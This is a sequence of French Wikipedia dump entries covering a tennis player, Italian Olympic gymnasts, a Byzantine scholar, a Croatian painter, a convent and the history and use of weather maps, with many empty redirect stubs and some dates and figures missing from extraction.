Le Coupe d'Océanie de rugby à XV 2007 est un tournoi organisé par la Federation of Oceania Rugby Unions qui oppose les nations d'Océanie. La finale se déroule le à Port Moresby.

</doc>
<doc id="7278536" url="https://fr.wikipedia.org/wiki?curid=7278536" title="Jeno Kamuti">
Jeno Kamuti



</doc>
<doc id="7278537" url="https://fr.wikipedia.org/wiki?curid=7278537" title="Federico Delbonis">
Federico Delbonis

Federico Delbonis, né le à Azul, est un joueur de tennis argentin, professionnel depuis 2007.
Il est membre de l'équipe d'Argentine de Coupe Davis, avec laquelle il a remporté le titre en 2016.
Carrière.
En juillet 2013 au tournoi de Hambourg, il atteint sa première finale en simple sur le circuit principal alors qu'il sort des qualifications et est classé à la mondiale. Il élimine notamment Fernando Verdasco (6-7, 7-6, 6-4), puis le cinquième joueur mondial (et ancien numéro un) Roger Federer en demi-finale (7-6, 7-6). Il finit par s'incliner contre l'Italien Fabio Fognini (4-6, 7-6, 6-2), non sans avoir obtenu trois balles de match dans le jeu décisif du deuxième set. Ces performances lui permettent d'atteindre la après le tournoi.
En février 2014, il remporte son premier tournoi ATP à l'Open du Brésil à São Paulo, en battant notamment Nicolás Almagro et Paolo Lorenzi en finale. En mai de la même année, il atteint la finale de l'Open de Nice, s'inclinant face à Ernests Gulbis après avoir écarté notamment John Isner et Gilles Simon, respectivement têtes de série et 4. En septembre, il joue pour la première fois en Coupe Davis, s'inclinant en double aux côtés d'Horacio Zeballos lors du match de barrage contre Israël.
En 2015, il participe aux trois rencontres de Coupe Davis que joue l'Argentine cette année-là, offrant la victoire à son équipe lors du match décisif contre le Brésil en huitièmes de finale en mars face à Thomaz Bellucci, puis s'imposant contre le Serbe Viktor Troicki en quarts, avant de s'incliner à deux reprises lors de la demi-finale contre la Belgique.
Début 2016, il atteint pour la première fois le tour d'un tournoi du Grand Chelem lors de l'Open d'Australie.
Au Masters d'Indian Wells en mars, il réalise l'exploit de battre le mondial Andy Murray, en 3 sets (6-4, 4-6, 7-6) pour atteindre les huitièmes de finale, où il s'incline contre Gaël Monfils.
En avril, il remporte son deuxième titre ATP au tournoi de Marrakech en battant Borna Ćorić (6-2, 6-4) en finale.
En juillet, il remporte ses deux matchs de simple contre les Italiens Andreas Seppi (7-6, 3-6, 6-3, 7-6) et Fabio Fognini (6-4, 7-5, 3-6, 7-5) lors du quart de finale de Coupe Davis, qualifiant son pays pour le tour suivant. Sélectionné à nouveau lors de la finale en novembre, à Zagreb, il perd d'abord le premier match de la rencontre face à Marin Čilić (6-3, 7-5, 3-6, 1-6, 6-2) dans un gros combat, avant de remporter le cinquième match décisif face à Ivo Karlović mondial (6-3, 6-4, 6-2) complètement à côté de la partie, offrant à l'Argentine la première victoire de son histoire dans cette compétition.
Classé mondial quand il se présente à Roland-Garros en 2019, il bat l'Espagnol et mondial Guillermo García-López au premier tour en quatre sets (6-1, 3-6, 6-3, 6-2), mais est éliminé au deuxième tour par l'Italien mondial, Fabio Fognini, en quatre sets (4-6, 6-3, 3-6, 3-6).
Il a remporté 11 titres Challenger en simple : à Manerbio en 2009, Rome en 2010, Bucaramanga et Barranquilla en 2013, Sarasota, Milan et Rome en 2015, Todi et Cali en 2017 et Biella en 2018. Il remporte également un titre à Pérouse en 2019. 
Le 29 janvier 2024, il annonce prendre sa retraite à l'âge de 33 ans après le Tournoi de Buenos Aires, il perd au premier tour en double avec son partenaire Facundo Bagnis contre la paire Jaume Munar / Roberto Carballés Baena (4-6, 2-6). 
Parcours dans les Masters 1000.
! width="50"|Année
! width="125"|Indian Wells
! width="125"|Miami
! width="125"|Monte-Carlo
! width="125"|Madrid
! width="125"|Rome
! width="125"|Canada
! width="125"|Cincinnati
! width="125"|Shanghai
! width="125"|Paris
Victoires sur le top 10.
Toutes ses victoires sur des joueurs classés dans le top 10 de l'ATP lors de la rencontre.

</doc>
<doc id="7278538" url="https://fr.wikipedia.org/wiki?curid=7278538" title="Jenö Kamuti">
Jenö Kamuti



</doc>
<doc id="7278550" url="https://fr.wikipedia.org/wiki?curid=7278550" title="Couvent des Ursulines de Saint-Hippolyte">
Couvent des Ursulines de Saint-Hippolyte

L'ancien couvent des Ursulines est un bâtiment religieux, protégé au titre des monuments historiques, situé à Saint-Hippolyte dans le département français du Doubs.
Localisation.
Le couvent est situé au centre du village, en bordure du cours d'eau du Doubs.
Histoire.
En 1618, des religieuses ursulines s'installent à Saint-Hippolyte afin d'aider et d'éduquer la population, et en particulier les jeunes filles. En raison du développement de cette activité, les sœurs font construire le couvent actuel en 1700, pour notamment y accueillir un pensionnat.
À la Révolution, les ursulines quittent le couvent qui abritera successivement la sous-préfecture, la gendarmerie et l'école.
L'ancien couvent bénéficie d'une inscription au titre des monuments historiques par arrêté du .
Architecture et décorations.
L'ensemble des bâtiments sont de plan rectangulaires en « U », enfermant une cour intérieure. Le rez-de-chaussée côté nord, au bord du Doubs, possède un galerie ouverte.
Au sud-ouest, un des murs porte une dédicace sur la pose de la première pierre de la construction du bâtiment : 

</doc>
<doc id="7278559" url="https://fr.wikipedia.org/wiki?curid=7278559" title="St John Publications">
St John Publications



</doc>
<doc id="7278564" url="https://fr.wikipedia.org/wiki?curid=7278564" title="Haley Danita Anderson">
Haley Danita Anderson



</doc>
<doc id="7278569" url="https://fr.wikipedia.org/wiki?curid=7278569" title="Thomas Peter Lurz">
Thomas Peter Lurz



</doc>
<doc id="7278570" url="https://fr.wikipedia.org/wiki?curid=7278570" title="Paul Kipngetich Tanui">
Paul Kipngetich Tanui



</doc>
<doc id="7278572" url="https://fr.wikipedia.org/wiki?curid=7278572" title="Maladies exanthématiques">
Maladies exanthématiques



</doc>
<doc id="7278573" url="https://fr.wikipedia.org/wiki?curid=7278573" title="Tissu cutané">
Tissu cutané



</doc>
<doc id="7278587" url="https://fr.wikipedia.org/wiki?curid=7278587" title="Aníta Hinriksdóttir">
Aníta Hinriksdóttir

Aníta Hinriksdóttir (née le à Reykjavik) est une athlète islandaise, spécialiste du 800 mètres.
Biographie.
Championne du monde jeunesse à Donetsk, elle remporte la médaille d'or lors des Championnats d'Europe juniors à Rieti après avoir terminé quatrième des Championnats du monde juniors à Barcelone en 2012.
Hinriksdóttir participe aux Championnats du monde d'athlétisme en salle 2014 à Sopot, en Pologne. En série du 800m, elle se qualifie initialement pour la finale en y établissant un nouveau record du monde junior. Finalement, elle sera quelques minutes plus tard disqualifiée pour avoir mordu le couloir voisin avant la ligne de rabattement. Le record du monde est donc annulé.
Le , Hinriksdóttir se classe du 800 m lors des championnats du monde en salle de Portland en 2 min 02 s 58. Le , elle prend la de la finale des Championnats d'Europe d'Amsterdam en 2 min 2 s 55, après avoir couru sa demi-finale en 2 min 01 s 41.
Le , l'Islandaise se classe des Bislett Games d'Oslo, prestigieuse étape de la ligue de diamant et bat son propre record national en 2 min 0 s 05, tout proche de la barre des 2 minutes.

</doc>
<doc id="7278589" url="https://fr.wikipedia.org/wiki?curid=7278589" title="Anita Hinriksdóttir">
Anita Hinriksdóttir



</doc>
<doc id="7278591" url="https://fr.wikipedia.org/wiki?curid=7278591" title="Anita Hinriksdottir">
Anita Hinriksdottir



</doc>
<doc id="7278595" url="https://fr.wikipedia.org/wiki?curid=7278595" title="Richard Trautmann">
Richard Trautmann

Richard Trautmann, né le à Munich, est un judoka allemand. Il est médaillé de bronze olympique à deux reprises, en 1992 et en 1996 en catégorie des moins de 60 kg.

</doc>
<doc id="7278598" url="https://fr.wikipedia.org/wiki?curid=7278598" title="Traudl Trautmann">
Traudl Trautmann



</doc>
<doc id="7278600" url="https://fr.wikipedia.org/wiki?curid=7278600" title="Luigina Giavotti">
Luigina Giavotti

Luigina Giavotti, née le à Pavie et morte le , est une gymnaste artistique italienne.
Carrière.
Luigina Giavotti remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7278601" url="https://fr.wikipedia.org/wiki?curid=7278601" title="Johann Friedrich Edelmann">
Johann Friedrich Edelmann



</doc>
<doc id="7278602" url="https://fr.wikipedia.org/wiki?curid=7278602" title="Anna Tanzini">
Anna Tanzini

Anna Luisa Tanzini, née le à Pavie, est une gymnaste artistique italienne.
Carrière.
Anna Tanzini remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Luigina Giavotti, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7278604" url="https://fr.wikipedia.org/wiki?curid=7278604" title="Anna Luisa Tanzini">
Anna Luisa Tanzini



</doc>
<doc id="7278605" url="https://fr.wikipedia.org/wiki?curid=7278605" title="Luisa Tanzini">
Luisa Tanzini



</doc>
<doc id="7278608" url="https://fr.wikipedia.org/wiki?curid=7278608" title="Carolina Tronconi">
Carolina Tronconi

Carolina Tronconi, née le à Pavie et morte le à Pavie, est une gymnaste artistique italienne.
Carrière.
Carolina Tronconi remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Anna Luisa Tanzini, Luigina Giavotti, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7278610" url="https://fr.wikipedia.org/wiki?curid=7278610" title="Ines Vercesi">
Ines Vercesi

Ines Vercesi, née le à Pavie et morte le à Sestri Levante, est une gymnaste artistique italienne.
Carrière.
Ines Vercesi remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Anna Luisa Tanzini, Carolina Tronconi, Luigina Giavotti, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7278613" url="https://fr.wikipedia.org/wiki?curid=7278613" title="Georges Amiroutzès">
Georges Amiroutzès

Georges Amiroutzès (en ) est un homme d'État, écrivain et philosophe grec du , né à Trébizonde au début de ce siècle, mort vers 1470.
Biographie.
Issu d'une famille noble de Trébizonde, il était cousin par sa mère de Mahmoud Pacha, qui fut grand vizir du sultan Mehmet II. Il apparaît pour la première fois dans la documentation comme l'un des savants et dignitaires laïcs qui accompagnent la délégation byzantine au concile de Ferrare-Florence (1438-39), comme Gémiste Pléthon et Georges Scholarios : il est venu avec le métropolite Dorothée de Trébizonde, et se montre un ferme partisan de l'union des Églises latine et grecque. Sylvestre Syropoulos le présente comme un personnage très désagréable : à la onzième session à Ferrare (), il se retire avec le "megas prôtosyncellos" Grégoire et un troisième homme identifié généralement comme Georges Scholarios du côté de la salle occupé par les Latins, et le groupe se paie ouvertement la tête de Marc d'Éphèse, champion des anti-unionistes ; à Florence, en mai 1439, au cours d'une réunion à part de la délégation byzantine, il s'en prend brutalement, avec Grégoire, Bessarion et Isidore de Kiev, au même Marc d'Éphèse, et comme Gémiste Pléthon tente de prendre sa défense, il le rabroue aussi très violemment, au point que tout le monde se demande comment il se fait que l'empereur Jean VIII ne le rappelle pas à l'ordre.
Il exerce ensuite d'importantes fonctions dans l'empire de Trébizonde : en 1447-49, il est à Gênes comme ambassadeur de l'empereur Jean IV Comnène, et ensuite porte les titres de "megas logothetês" et de "prôtovestiarios" à la cour de David II. Au moment où les troupes du sultan Mehmet II assiègent Trébizonde (1461), c'est lui qui mène les pourparlers avec le grand vizir Mahmoud Pacha, son cousin germain, et c'est probablement lui qui conseille la capitulation (). L'événement ne se passe cependant pas très bien pour lui, car dans une lettre à Basile Bessarion (), après avoir relaté la conquête par les Turcs de leur patrie commune, il demande de l'argent pour pouvoir obtenir la libération de son fils Basile.
Ensuite, grâce à l'entremise de son cousin le grand vizir, il entre en contact avec le sultan lui-même et vit à sa cour à Constantinople. L'humaniste Georges de Trébizonde l'y rencontre au cours de son séjour en 1465-66. Son succès auprès de Mehmet II le fait accuser d'apostasie par des chrétiens ; en fait, le "Dialogue avec le sultan sur la foi chrétienne" semble indiquer qu'il s'entretenait avec le souverain en tant que chrétien ; ses deux fils (Basile et Alexandre) ont bien fini par se convertir à l'islam (en devenant respectivement Mehmet Bey et Skender Bey), mais on ne sait pas à quelle date. Vers 1468-70, il entretient une correspondance (trois lettres de sa part) avec Théodore Agallianos (alors métropolite Théophane de Médeia) au sujet du dialogue "Sur la Providence" de ce dernier.
Œuvre.
Fort mal considéré de ses compatriotes grecs, à la fois pour son militantisme en faveur de l'union des Églises et pour sa supposée apostasie à la cour de Mehmet II, il était en revanche unanimement considéré comme un des hommes les plus érudits de son temps (et surnommé pour cette raison « le Philosophe »). Cependant, un petit nombre seulement de ses textes subsistent, qui ne peuvent expliquer cette grande réputation, sans qu'on sache si des œuvres plus importantes ont été perdues. 
Deux œuvres conservées d'Amiroutzès sont liées à ses relations avec le sultan : un traité sur la "Géographie" de Ptolémée, et un dialogue entre le philosophe et le sultan sur la foi chrétienne. Michel Critoboulos rapporte que c'est pendant l'été 1465 que le souverain ottoman commanda à Amiroutzès une carte du monde fondée sur l'ouvrage de Ptolémée ; les noms sur la carte furent écrits en grec et en arabe (en cette dernière langue par Basile Amiroutzès, qui l'avait déjà apprise) ; le résultat séduisit tellement le sultan qu'il commanda une traduction entière de l'ouvrage de Ptolémée en arabe. Le commentaire sur cet ouvrage dut accompagner la réalisation de la carte. Quant au « dialogue religieux » avec Mehmet II, sa version écrite, sans doute l'un des derniers textes d'Amiroutzès, se présente comme une œuvre polémique et apologétique destinée à un public chrétien. Les deux textes ne sont conservés que dans des traductions latines du début du : le premier ("De his quæ Geographiæ debent adesse") dans un volume en latin consacré aux œuvres géographiques de Ptolémée, réalisé à Nuremberg en 1514 par Johannes Werner ; le second ("Dialogus de fide in Christum habitus cum rege Turcarum", ou "Philosophus vel de fide") dans une traduction anonyme réalisée à Rome en 1518 et qui se trouve dans le manuscrit "Paris. lat. 3395".
Quinze textes philosophiques fragmentaires ou à l'état d'ébauche ont été publiés en un volume chez Peeters en 2011 ; ils révèlent un philosophe aristotélicien influencé par le thomisme, très hostile au platonisme. Sinon, on conserve six lettres authentiques : l'une à un certain Michel Koressios de Thessalonique, postérieure à la chute de Constantinople en 1453, et consacrée à un débat théologique avec un Latin ; la lettre à Bessarion du sur la chute de Trébizonde ; trois lettres à Théodore Agallianos et une à Michel Critoboulos (1468-70) consacrées au dialogue "Sur la Providence" d'Agallianos (et conservées dans la correspondance de ce dernier). Il faut ajouter la profession de foi rédigée à Florence, six poèmes conservés dans un manuscrit du mont Athos ("Dionysiou 263"), et un autre dans un manuscrit d'Istanbul ("Topkapı Sarayı G.I.39").

</doc>
<doc id="7278614" url="https://fr.wikipedia.org/wiki?curid=7278614" title="Rita Vittadini">
Rita Vittadini

Rita Vittadini, née le à Milan et morte le à Pavie, est une gymnaste artistique italienne.
Carrière.
Rita Vittadini remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Luigina Giavotti, Virginia Giorgi, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7278616" url="https://fr.wikipedia.org/wiki?curid=7278616" title="Virginia Giorgi">
Virginia Giorgi

Virginia Giorgi, née le à Pavie, où elle est morte le , est une gymnaste artistique italienne.
Carrière.
Virginia Giorgi remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Luigina Giavotti, Germana Malabarba et Carla Marangoni.

</doc>
<doc id="7278618" url="https://fr.wikipedia.org/wiki?curid=7278618" title="Slavko Kopač">
Slavko Kopač

Slavko Kopač (né le à Vinkovci en Yougoslavie, actuelle Croatie, et mort à Paris le à Clichy) est un peintre, sculpteur et céramiste franco-croate.
Biographie.
Après des études à l'académie des beaux arts de Zagreb, Slavko Kopač fait un stage d'un an à Paris, de 1939 à 1940, avec une bourse que lui a accordée le gouvernement français. Puis, à cause de la Seconde Guerre mondiale, citoyen croate, il est obligé de retourner dans l'État indépendant de Croatie où il arrive en avril 1941 après être passé par Mostar plusieurs semaines et avant d'atteindre la capitale pour enseigner au Lycée de Zagreb jusqu'en 1943.
De 1943 à 1948, il arrive à passer en Italie et vit et travaille à Florence. En août 1948, il s'installe définitivement à Paris et rencontre Jean Dubuffet puis devient le conservateur de la collection de La compagnie de l'art brut dont il est un des fondateurs. Certaines de ses œuvres furent d'abord léguées par Dubuffet à la Collection de l'art brut de Lausanne avant que Kopač ne demande lui-même leur retrait pour en faire don à un musée en Croatie.
Œuvre.
Slavko Kopač fut un ami et employé de Jean Dubuffet, dont plusieurs œuvres ont été intégrées dans la collection d'Art brut et la « Neuve invention » avant que le premier ne les retire pour les léguer à un musée en Croatie. Son œuvre a été exposée à partir de 1977 à Zagreb, et au Paris Art Center en 1981. La Galerie Alphonse Chave lui a rendu hommage en 1985 en l'exposant aux côtés de Jean Dubuffet à Vence, sous le titre "Salut à Jean Dubuffet". En 1988, Ante Glibota lui commande une monumentale sculpture pour The Olympic Sculpture Park, Olympic Center à Seoul. Enfin, une importante rétrospective lui est consacrée en 2022 à Zagreb dans le Pavillon Meštrović en 2022 et l'année suivante le musée national d'art moderne Centre Pompidou acquiert une douzaine d'oeuvres. En septembre 2025 une importante exposition intitulée "Slavko Kopac, the hidden treasure" est montrée à l'Accademia delle Arti del Disegno di Firenze.
Parmi les œuvres de Kopač à la galerie Chave se trouvaient :
Kopač a également été exposé à la Salle Saint Jean de l'Hôtel de ville de Paris en 1996 — voir le tableau "Femme couchée" (1982), extrait du catalogue d'exposition.
Slavko Kopač fait aussi partie des artistes de la Collection d'art brut dont les œuvres sont conservées à Lausanne dans l'annexe de la « Neuve invention ».
Son travail a été présenté ainsi : 
Annie Le Brun, qui fut son amie, insiste cependant sur ce qui l'apparente et le distingue aussi de Jean Dubuffet : « personne n'aura eu comme Kopač ce sens inné du luxe naturel, du luxe organique, du luxe presque intolérable de la liberté en devenir. D'ailleurs, c'est peut-être en quoi il se sépare de Jean Dubuffet dont l'œuvre, tour à tour “féroce”, “sordide”, se présente d'abord comme “une véhémente protestation contre le monde, une sorte de voyage au bout de la nuit picturale” [...] Et cela même alors que Jean Dubuffet, de son côté, a toujours insisté sur ce qui les rapproche : “Comme mes propres travaux ceux de Kopač tournent le dos à l'art institutionnel. Il se refuse à emprunter rien à l'intellectualisme culturel. Il a pris entièrement le parti de la brûlante spiritualité sauvage. Il n'a quêté que de l'innocence, de l'invention pure. Son art cependant est extrêmement contrôlé et raffiné. » Dubuffet poursuit en parlant de « raffinement barbare », ce qui, selon Annie Le Brun, « caractérise très exactement le déroutant mélange de subtilité et de violence dont sont marquées toutes les inventions de Kopač. » Néanmoins, malgré leur passion partagée pour l'Art brut, Kopač s'est toujours tenu éloigné du projet esthétique de Dubuffet de constituer une « anti-culture », selon une « stratégie de la subversion », ce qui selon Annie Le Brun, « différencie un esthète, le fût-il à rebours, et un poète », dont l'enjeu dépasse les notions de création, art ou esthétique, pour interroger le sens de la vie, dans un « écart absolu ».
Kopač avait également des liens étroits avec Michel Tapié et André Breton du fait même qu'ils avaient été membres fondateurs de la Compagnie de l'art brut. André Breton fera une remarquable exposition monographique sur Kopač à la Galerie de l’Étoile Scellée du au à Paris.

</doc>
<doc id="7278619" url="https://fr.wikipedia.org/wiki?curid=7278619" title="Le Bon Roi Dagobert (chanson)">
Le Bon Roi Dagobert (chanson)



</doc>
<doc id="7278621" url="https://fr.wikipedia.org/wiki?curid=7278621" title="Germana Malabarba">
Germana Malabarba

Germana Malabarba, née le à Pavie et morte le , est une gymnaste artistique italienne.
Carrière.
Germana Malabarba remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti, Lavinia Gianoni, Luigina Perversi, Diana Pizzavini, Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Luigina Giavotti et Carla Marangoni.

</doc>
<doc id="7278622" url="https://fr.wikipedia.org/wiki?curid=7278622" title="Carte météorologique">
Carte météorologique

Une carte météorologique est une carte géographique sur laquelle les données de certains paramètres météorologiques sont pointées et analysées pour donner une représentation de l'état de l'atmosphère à un temps précis. Il en existe deux types : carte du temps présent, où les informations des stations météorologiques de surface ou des radiosondages sont inscrites, et cartes de prévision météorologique, où ces mêmes paramètres sont tracés pour un temps futur.
Les premières cartes météorologiques sont apparues au , alors que divers pays commençaient à construire des stations météorologiques et que l'Organisation météorologique internationale était mise sur pied pour partager ces informations.
Sur les cartes d'analyse du temps présent, les données des stations de surface ou de radiosondage (température, pression, vents, etc.) sont inscrites selon un code international à l'endroit où elles sont prises. Par la suite, les lignes représentant des valeurs égales sont tracées pour donner une image d'un champ particulier de ces données (isobares, isallobares, ligne de même point de rosée, etc.). Finalement, des analyses supplémentaires sont ajoutées subjectivement, comme la position des fronts météorologiques. Dans le cas de cartes de prévision, les champs prévus de ces variables seront tracés pour l'usage des météorologues, une carte avec des symboles représentant le temps prévu dans le cas des cartes utilisées par les médias, ou des cartes spécialisées pour certains éléments du temps comme les zones de givrage pour l'aviation.
Histoire.
Réseaux de stations météorologiques.
En 1849, le "Smithsonian Institution", sous la direction du physicien Joseph Henry 
commence à mettre sur pied un réseau de stations météorologiques d'observation aux États-Unis. Les observations seront disséminées rapidement grâce à l'invention en 1837 par Samuel Morse du télégraphe.
Le , une violente tempête provoque le naufrage de 41 navires français en mer Noire, au cours de la guerre de Crimée. Cette tempête avait traversé toute l'Europe de l'Ouest, mais personne ne fut en mesure de signaler, voire prévenir du danger. Face à ce constat, Urbain Le Verrier, directeur de l'observatoire de Paris, décide de mettre en place un vaste réseau de stations météorologiques couvrant l'ensemble de l'Europe et mettant à profit l'innovation technologique que représente le récent télégraphe électrique. Le 16 février 1855, son projet de réseau de météorologie destiné à avertir les marins de l'arrivée des tempêtes, est adopté par l'Empereur Napoléon III. Trois jours plus tard, Le Verrier présente à l'Académie des sciences la première carte météorologique de France. La Grande-Bretagne et les autres puissances européennes suivent dans la même lignée.
Tous les réseaux d'observations mentionnés jusqu'à présent étaient indépendants. Une information météorologique cruciale pouvait donc ne pas être transmise. Ceci était particulièrement important en mer. Le principal promoteur d'échanges internationaux sera l'américain Matthew Fontaine Maury. En 1853, une première conférence des représentants de dix pays se réunit à Bruxelles pour formaliser une entente et normaliser le codage des données météorologiques. En 1873, l'Organisation météorologique internationale (OMI) est fondée à Vienne par les pays ayant un service météorologique.
Premières cartes.
En 1856, Joseph Henry est à Washington D.C. le premier à exposer une carte de prévision météorologique des bassins de l'Ohio aux rivages de la côte atlantique : elle représente les formations nuageuses des contrées continentales qui sont déplacées par les vents d'ouest dominants. Le temps de l'Ohio permet de supposer par translation de ses masses nuageuses en une journée le temps prévisible sur la Virginie, le Maryland ou New-York. Le travail devenant trop important pour le "Smithsonian", le gouvernement des États-Unis reprit le flambeau entre 1870 et 1874 par l'entremise du l'U.S. Army Signal Corps.
En 1860, le vice-amiral Robert FitzRoy utilise le télégraphe pour colliger les données météorologiques quotidiennes venant de toute l'Angleterre et Francis Galton trace les premières cartes synoptiques dès 1861. Ce dernier a utilisé sa carte pour prouver que l'air circulait dans le sens des aiguilles d'une montre autour des zones de haute pression, inventant le terme « anticyclone » pour décrire le phénomène. Il a également joué un rôle déterminant dans la publication de la première carte météorologique dans un journal, pour lequel il a modifié le pantographe qui permet de reproduire la carte sur le bloc d'imprimerie. La variation de ces cartes dans le temps permet à FitzRoy d'établir les premières prévisions qu'il publie dans le journal "The Times".
Standardisation.
Au début, la prise de données, le format de transmission et le temps n'étaient pas standardisés ce qui rendait la production de carte difficile. Avec l'adoption du temps universel coordonné et la réglementation de l'OMI, les observations commencèrent à être prise à heure fixe et comportèrent les mêmes informations. Cela permit de produire des cartes météorologique de surface couvrant beaucoup plus qu'un pays. Graduellement, les analyses ont pu être étendues à l'hémisphère nord puis à toute la terre.
Cartes d'altitude.
Avec le développement de l'aérologie au début du , des données en altitude ont pu être prises de la température, de l'humidité, de la pression et du vent. Ces données sont devenus plus denses avec la mise sur pied de station de lancement de ballons sonde, puis de l'aviation. Graduellement des cartes à des niveaux constant de pression en altitude ont été produites. Ainsi, aux États-Unis, le Weather Bureau a commencé à émettre des cartes de à partir du juillet 1948 et à à partir du 14 mai 1954.
Interprétation.
En 1838, William Reid publie sa controversée "Law of Storms" décrivant le comportement des dépressions. Son ouvrage divise la communauté scientifique durant dix années. En 1841, l'américain Elias Loomis est le premier à suggérer la présence de fronts pour expliquer la météo mais ce n'est qu'après la Première Guerre mondiale que l'école norvégienne de météorologie développera ce concept. Ce n'est que plus tard que la recherche en météorologie et le développement des ordinateurs a permis de passer d'une interprétation empirique de l'analyse des cartes météorologiques à une autre quantifiable avec les équations primitives atmosphériques.
Cartes d'analyses.
Carte de surface.
Les stations météorologiques et les navires font régulièrement des rapports d'observation de plusieurs données sous forme de messages normalisés appelés "METAR". Ces messages comprennent le code de la station, la date et l'heure de l'observation, le vent, la visibilité horizontale, les nuages (types et couverture en octas), la température et le point de rosée, la pression au niveau de la mer et des remarques et données additionnelles si nécessaire.
Ces données vont être inscrites (pointées) sur une carte géographique selon le modèle de pointage qui se retrouve dans la figure à droite. Chaque information a une position et une représentation définie autour du point central. Ainsi le météorologue peut d'un coup d’œil repérer l'information qui l'intéresse. Ce pointage doit prendre peu de place afin de maximiser le nombre de stations visibles sur la carte, sans chevauchement, dans une région à forte densité de stations.
C'est à partir des informations contenues dans le pointage de l'ensemble des stations que différentes lignes d'égale valeur peuvent être tracées pour repérer la configuration de différents champs météorologiques. La plus connue de ces lignes est l'isobare. Celles-ci représentent la pression atmosphérique au niveau moyen de la mer et sont tracées à chaque ce qui permet de repérer les dépressions et les anticyclones associés avec le temps qu'il fait sur une région. L'image en dessous est un bon exemple d'une carte de surface de cela. En agrandissant celle-ci, il est possible de voir le pointage des stations météorologiques.
Il est possible d'analyser tous les autres paramètres de la même manière. Ainsi, le météorologue peut tracer les lignes suivantes :
De même, il peut tracer les zones ayant des précipitations et leur type, ainsi que les fronts qui sont des entités associés avec les forces dynamiques qui font évoluer l'atmosphère dans le modèle norvégien de cyclogénèse. Cette analyse est seulement limitée par la visibilité des données car trop de lignes se superposant se font obstruction.
Jusqu'aux années 1970, le pointage se faisant manuellement par un technicien en météorologie sur une grande carte en papier et le météorologue ajoutait l'analyse. Depuis ce temps, l'avènement des ordinateurs a permis de plus en plus d'automatiser ce processus et de finalement de faire l'affichage directement sur un écran. Cependant, les météorologues peuvent encore corriger les analyses car ils peuvent remarquer des erreurs causées par de mauvaises données.
Carte d'altitude.
Il existe un réseau mondial de radiosondage coordonné par l'Organisation météorologique mondiale (OMM) et opéré par les divers services météorologiques nationaux. Deux fois par jour, à 0 h et UTC, des ballons-sondes sont lâchés et recueillent les informations sur la température, l'humidité, la pression et les vents lors de leur montée qui va se terminer plus de au-dessus du sol.
De plus, la plupart des avions de ligne sont équipés de transpondeurs qui peuvent donner les mêmes informations à intervalle régulier durant le vol de l'appareil par le message "AMDAR". Finalement, les satellites météorologiques captent plusieurs longueurs d'onde émises par l'atmosphère ce qui permet de tirer des informations sur sa structure thermique, la couverture nuageuse et la présence de précipitations.
Comme dans le cas des rapports en surface, toutes ces données vont être pointées sur des cartes météorologiques. Celles-ci sont tracées à des niveaux de pression constants, appelés surfaces isobares type, et c'est la hauteur du géopotentiel (la hauteur du niveau de pression au-dessus du niveau de la mer) qui sera indiqué. Chaque information est pointée selon un modèle similaire à celui des stations de surface.
Les lignes d'analyse les plus connues sont les isohypses, tracées à chaque 6 décamètres (ou ), mais encore une fois de nombreuses autres peuvent être affichées. En plus des données de paramètres directs comme la température, il est possible de calculer et de tracer d'autres champs comme l'axe du courant-jet, la hauteur de la tropopause, le mouvement vertical et les advections de température.
Cartes prévues.
Le but premier de la production de carte d'analyse météorologique est de comprendre la situation météorologique et de prévoir son évolution. Les premières cartes prévues n'étaient que des extrapolations à court terme de la position des systèmes comme les dépressions et les anticyclones en utilisant la persistance. C’est-à-dire que le météorologique suivait le déplacement des systèmes, des courants-jets, etc. à partir des données prises à toutes les 6 heures en altitude et des données de surface à toutes les heures.
Par la suite, les chercheurs en météorologie ont suggéré des explications plus physiques reliées à la mécanique des fluides. Finalement, le développement des ordinateurs depuis les années 1950 a permis de calculer les solutions mathématiques des équations de la prévision numérique du temps. Grâce aux superordinateurs, il est maintenant possible de produire des cartes météorologiques brutes, similaires aux cartes d'analyses, pour une période de plus en plus longue. On compte parmi celles-ci des cartes de pression atmosphérique, de cumuls de pluie, de vent, etc.
Carte du temps significatif.
Aviation.
Chaque pays a sa propre zone de responsabilité pour la production des prévisions aéronautiques. Habituellement, les météorologues émettent une prévision des prochaines 24 heures, pour chaque période de 6 heures, pour les conditions en dessous de () couvrant leur pays. Cependant, des ententes internationales existent pour couvrir la couche au-dessus de cette altitude et les océans. Ce sont alors certains centres nationaux (par exemple États-Unis et Canada) ou continentaux (par exemple : centre européen) qui en ont la responsabilité.
